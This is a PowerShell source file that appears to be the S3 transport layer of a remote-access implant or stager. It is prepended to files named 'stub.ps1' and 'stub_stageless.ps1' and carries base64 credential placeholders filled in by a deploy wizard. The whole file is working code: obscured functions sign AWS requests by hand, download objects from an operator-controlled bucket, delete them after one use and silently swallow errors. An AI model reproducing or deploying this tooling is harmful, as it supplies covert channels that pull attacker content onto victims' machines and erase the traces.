# === TRANSPORT: AWS S3 (stub layer, PowerShell) ===
# Provides _Tk (ready signal), _Dl (download), _Rm (delete) with inline Sig V4 signing.
# No OAuth token - each request is signed with .NET HMACSHA256.
# Credentials substituted by wizard at deploy time.
# Prepended to agent/stub.ps1 and agent/stub_stageless.ps1.

$_Ak = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_ACCESS_KEY_ID_B64'))
$_Sk = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_SECRET_ACCESS_KEY_B64'))
$_Sr = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_S3_REGION_B64'))
$_Sb = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('STUB_S3_BUCKET_B64'))
$_Sh = "$_Sb.s3.$_Sr.amazonaws.com"
$_Su = "https://$_Sh"
$_Eh = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'

function _StubHmac([byte[]]$key, [string]$msg) {
    $h = New-Object System.Security.Cryptography.HMACSHA256
    $h.Key = $key
    return $h.ComputeHash([Text.Encoding]::UTF8.GetBytes($msg))
}

function _StubSha256Str([string]$s) {
    $sha = New-Object System.Security.Cryptography.SHA256Managed
    return [BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($s))).Replace('-','').ToLower()
}

function _StubBtoH([byte[]]$bytes) {
    return [BitConverter]::ToString($bytes).Replace('-','').ToLower()
}

function _S4Key([string]$date) {
    $k0 = _StubHmac ([Text.Encoding]::UTF8.GetBytes("AWS4$_Sk")) $date
    $k1 = _StubHmac $k0 $_Sr
    $k2 = _StubHmac $k1 "s3"
    return _StubHmac $k2 "aws4_request"
}

function _S4Sign([string]$method, [string]$rawPath) {
    $kp    = $rawPath.TrimStart('/')
    $dt    = (Get-Date).ToUniversalTime().ToString('yyyyMMddTHHmmssZ')
    $date  = $dt.Substring(0,8)
    $scope = "$date/$_Sr/s3/aws4_request"
    $cr    = "$method`n/$kp`n`nhost:$_Sh`nx-amz-content-sha256:$_Eh`nx-amz-date:$dt`n`nhost;x-amz-content-sha256;x-amz-date`n$_Eh"
    $sts   = "AWS4-HMAC-SHA256`n$dt`n$scope`n$(_StubSha256Str $cr)"
    $sig   = _StubBtoH (_StubHmac (_S4Key $date) $sts)
    $script:_S4A = "AWS4-HMAC-SHA256 Credential=$_Ak/$scope, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=$sig"
    $script:_S4D = $dt
}

# -- transport ready signal (S3 has no OAuth token) --
function _Tk { return 'ok' }

# -- download file to stdout --
function _Dl($tk, $path) {
    try {
        _S4Sign 'GET' $path
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Authorization',           $script:_S4A)
        $wc.Headers.Add('X-Amz-Date',             $script:_S4D)
        $wc.Headers.Add('X-Amz-Content-Sha256',   $_Eh)
        $kp = $path.TrimStart('/')
        $bytes = $wc.DownloadData("$_Su/$kp")
        return [Text.Encoding]::UTF8.GetString($bytes)
    } catch { _dbg "s3 download '$path' error: $_"; return $null }
}

# -- delete file (BK one-time use) --
function _Rm($tk, $path) {
    try {
        _S4Sign 'DELETE' $path
        $kp = $path.TrimStart('/')
        Invoke-RestMethod -Method Delete -ErrorAction SilentlyContinue `
            -Uri "$_Su/$kp" `
            -Headers @{
                Authorization           = $script:_S4A
                'X-Amz-Date'           = $script:_S4D
                'X-Amz-Content-Sha256' = $_Eh
            } | Out-Null
    } catch {}
}
